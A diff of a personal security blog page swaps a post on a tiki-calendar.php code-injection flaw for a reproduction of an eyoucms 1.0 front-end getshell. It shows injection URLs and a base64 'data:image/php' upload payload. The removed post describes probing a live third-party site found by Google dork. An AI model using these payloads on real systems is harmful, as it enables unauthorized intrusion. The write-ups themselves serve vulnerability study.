@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>rnpnet tiki-calendar.php页面存在代码执行漏洞 · Hu3sky&#39;s blog</title>
+    <title>eyoucms前台getshell复现 · Hu3sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Hu3sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">rnpnet tiki-calendar.php页面存在代码执行漏洞</a>
+                <a href="#" class="post-name">eyoucms前台getshell复现</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            rnpnet tiki-calendar.php页面存在代码执行漏洞
+            eyoucms前台getshell复现
             <!-- 404 -->
             
         </h1>
@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">261</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">422</span> / Reading time: <span class="post-count">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/04/01</span>
+                    <span class="post-intro-time">2018/08/25</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -390,20 +390,20 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>emmm。最近跟着彭哥做项目，疯狂的复现一些cve，包括上传漏洞和代码执行漏洞。</p>
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>因为这个漏洞是发生在calendar.php。由于exp给的源码本地没有复现成功，所以想着去外面看看能不能找到洞。于是 谷歌 inurl:tiki-calendar.php。找到一堆，试了前面几个 不行，于是在尝试到rnpnet的时候，意外的惊喜出现了。</p>
-<h1 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yoururl/tiki-calendar.php?viewmode=&apos;;print(&apos;Hu3sky牛逼Hu3sky牛逼Hu3sky牛逼Hu3sky牛逼Hu3sky牛逼Hu3sky牛逼Hu3sky牛逼Hu3sky牛逼&apos;);$a=&apos;</span><br></pre></td></tr></table></figure>
-<p>  <img src="/ctf/代码执行1.png" alt="复现">emmm。不要在意输出的是什么，略过略过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yoururl/tiki-calendar.php?viewmode=&apos;;phpinfo();$a=&apos;这样就直接输出了phpinfo</span><br></pre></td></tr></table></figure></p>
-<p> <img src="/ctf/代码执行.png" alt="phpfinfo"></p>
-<h1 id="0x03漏洞原理"><a href="#0x03漏洞原理" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h1><p>在这个viewmode处并没有进行过滤处理。可以直接用单引号闭合然后就输入你想要执行的代码。然后后面的$a变量任意是什么都行，也可以直接是一个单引号，作用主要就是对viewmode的单引号进行闭合。</p>
+        <h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><p>官网：<a href="http://www.eyoucms.com/download/" target="_blank" rel="noopener">http://www.eyoucms.com/download/</a><br>Cms下载地址：<a href="http://www.eyoucms.com/eyoucms1.0.zip" target="_blank" rel="noopener">http://www.eyoucms.com/eyoucms1.0.zip</a></p>
+<h1 id="漏洞出现位置"><a href="#漏洞出现位置" class="headerlink" title="漏洞出现位置"></a>漏洞出现位置</h1><p>页面：<a href="http://127.0.0.1/index.php/api/Uploadify/preview" target="_blank" rel="noopener">http://127.0.0.1/index.php/api/Uploadify/preview</a><br>代码位置 application\api\controller\Uploadify.php</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞在第201行开始</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">        //获取 原始数据的只读流</span><br><span class="line">        $src = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">        //正则判断，图片base64编码数据</span><br><span class="line">        //绕过正则 data:image/php;base64</span><br><span class="line">        if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) &#123;</span><br><span class="line">            $previewUrl = sprintf(</span><br><span class="line">                &quot;%s://%s%s&quot;,</span><br><span class="line">                isset($_SERVER[&apos;HTTPS&apos;]) &amp;&amp; $_SERVER[&apos;HTTPS&apos;] != &apos;off&apos; ? &apos;https&apos; : &apos;http&apos;,</span><br><span class="line">                $_SERVER[&apos;HTTP_HOST&apos;],$_SERVER[&apos;REQUEST_URI&apos;]</span><br><span class="line">            );</span><br><span class="line">            //获取路径</span><br><span class="line">            $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);</span><br><span class="line">            //获取base64数据</span><br><span class="line">            $base64 = $matches[2];</span><br><span class="line">            //获取base64后缀 此时为php</span><br><span class="line">            $type = $matches[1];</span><br><span class="line"></span><br><span class="line">            //判断type是否是jepg，若为jepg则type就为jpg</span><br><span class="line">            //所以构造后缀为php</span><br><span class="line">            //例如：data:image/php;base64。此时type=php</span><br><span class="line">            //而下面判断是$type等于jepg赋值为jpg，后缀完美可外部控制</span><br><span class="line">            if ($type === &apos;jpeg&apos;) &#123;</span><br><span class="line">                $type = &apos;jpg&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            //设置文件名称</span><br><span class="line">            $filename = md5($base64).&quot;.$type&quot;; //这里我们可以控制为php</span><br><span class="line">            //设置文件路径</span><br><span class="line">            $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">            //判断文件是否存在，如果存在 返回文件路径</span><br><span class="line">            if (file_exists($filePath)) &#123;</span><br><span class="line">                die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&apos;.$previewUrl.&apos;preview/&apos;.$filename.&apos;&quot;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //将外部的base64数据解码</span><br><span class="line">                $data = base64_decode($base64);</span><br><span class="line">                //写入文件，生成文件</span><br><span class="line">                file_put_contents($filePath, $data);</span><br><span class="line">                die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&apos;.$previewUrl.&apos;preview/&apos;.$filename.&apos;&quot;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : &#123;&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;&#125;&#125;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此漏洞正则背锅，仅仅以data:image/作为图片，而忽略了data:image/php，即可绕过。</p>
+<h1 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h1><p>在 <a href="http://127.0.0.1/index.php/api/Uploadify/preview" target="_blank" rel="noopener">http://127.0.0.1/index.php/api/Uploadify/preview</a> 处，post数据 <code>data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==</code>.即可得到文件路径<img src="/eyou/1.png" alt="1">。用域名+后面部分，即可getshell。<br><img src="/eyou/2.png" alt="2"></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://yoursite.com">Hu3sky</a>
-            <p>原文链接: <a href="http://yoursite.com/2018/04/01/代码执行/">http://yoursite.com/2018/04/01/代码执行/</a>
-            <p>发表日期: <a href="http://yoursite.com/2018/04/01/代码执行/">April 1st 2018, 12:00:00 am</a>
+            <p>原文链接: <a href="http://yoursite.com/2018/08/25/哦呦、/">http://yoursite.com/2018/08/25/哦呦、/</a>
+            <p>发表日期: <a href="http://yoursite.com/2018/08/25/哦呦、/">August 25th 2018, 2:10:43 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -412,16 +412,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/04/10/scrapy笔记/" title= Scrapy笔记 >
-                    <div class="nextTitle">Scrapy笔记</div>
+                <a href= "/2018/08/25/eyou前台getshell/" title= eyoucms前台getshell复现 >
+                    <div class="nextTitle">eyoucms前台getshell复现</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/03/28/cookie与session/" title= cookie与session的笔记 >
-                    <div class="prevTitle">cookie与session的笔记</div>
+                <a href= "/2018/08/23/Hooskcms/" title= Hooskcms 几个小洞 >
+                    <div class="prevTitle">Hooskcms 几个小洞</div>
                 </a>
             
         </li>
@@ -437,7 +437,7 @@ height:50vh;
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        // id: "rnpnet tiki-calendar.php页面存在代码执行漏洞", // 可选。默认为 location.href
+        // id: "eyoucms前台getshell复现", // 可选。默认为 location.href
         owner: 'Hu3sky',
         repo: 'gitment-comments',
         oauth: {
@@ -549,7 +549,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-number">2.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x02漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03漏洞原理"><span class="toc-number">4.</span> <span class="toc-text">0x03漏洞原理</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cms"><span class="toc-number">1.</span> <span class="toc-text">cms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞出现位置"><span class="toc-number">2.</span> <span class="toc-text">漏洞出现位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞演示"><span class="toc-number">4.</span> <span class="toc-text">漏洞演示</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
